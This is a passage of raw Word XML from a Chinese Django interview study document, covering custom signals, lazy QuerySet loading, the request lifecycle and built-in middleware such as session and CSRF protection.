          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>providing_args</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>是一个列表，由信号将提供给监听者的参数名称组成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79681969" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.signals </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Signal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A3D283" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 1. 定义邮件发送信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCFA31D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>email_send = Signal(providing_args=[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'email'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B159DE"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expand"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-expand"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>信号处理函数的定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D15451"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line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>信号处理函数一般定义在定义在子应用下的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>signals.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>文件中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639C89E1" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 2. 处理函数定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="076270A8" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> send_email(sender, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6688906E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"""email_send信号处理函数"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2019BD08" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># TODO: 可以在这里编写信号的处理代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1675930E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'email_send信号处理函数被调用'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37974DF0"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expand"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-expand"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>信号的连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4295BF76"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line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>信号连接就是将信号和处理函数对应起来，信号连接一般是在子应用配置类的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>ready</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法中进行操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05DEF274" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> TestAppConfig(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550804C9" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAC7926" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> ready(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B07063" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 3. 信号连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D447AD" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        email_send.connect(send_email)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCE9D27"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expand"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-expand"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>信号发送</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546FAAD2" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="md-line"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>发出信号之后，信号连接的处理函数就会被调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF92955" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>email_send.send(sender=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'信号发出者'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B7C6D8" w14:textId="6B383370"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027</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>懒加载是什么</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5411A0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>答：懒加载：使用的时候再去加载。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D351A11" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">1）数据库查询：    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1935CA3B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        all，filter, exclude, order_by：返回查询集QuerySet    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9BFAEC" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        惰性查询：只有使用查询集中数据的时候才会进行数据库的查询。    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF60022" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">2）项目配置信息   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E187A11" w14:textId="65F420FA" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.conf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> settings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0FC9ED" w14:textId="3ED48FA4" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022"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del w:id="755" w:author="ABM ABM" w:date="2020-10-05T00:07:00Z">
        <w:r w:rsidRPr="00A63022" w:rsidDel="0005395B">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00C97D3B">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>028</w:t>
      </w:r>
      <w:r w:rsidR="00C97D3B">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请求的生命周期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C2445D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>请求生命周期：客户端发起请求-&gt;服务器响应完整过程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC597A0" w14:textId="2A213FDB" w:rsidR="00A63022" w:rsidRDefault="001D56F9" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="589B760B" wp14:editId="2267C99E">
            <wp:extent cx="6924039" cy="3270446"/>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934790" cy="3275524"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6574D78F" w14:textId="573075E6"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029</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>列举</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的内置中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7E6616" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">SessionMiddleWare：session中间件    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621F2B5D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    获取：request.session[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'&lt;key&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">]    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116EC278" w14:textId="4891F6E7" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    设置：request.session[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'&lt;key&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">] = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'&lt;value&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61273FD9" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">CsrfViewMiddleware：csrf保护中间件    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C941E6" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    每次请求之前，进行csrf的验证    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707C5697" w14:textId="6DD0E0C3" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
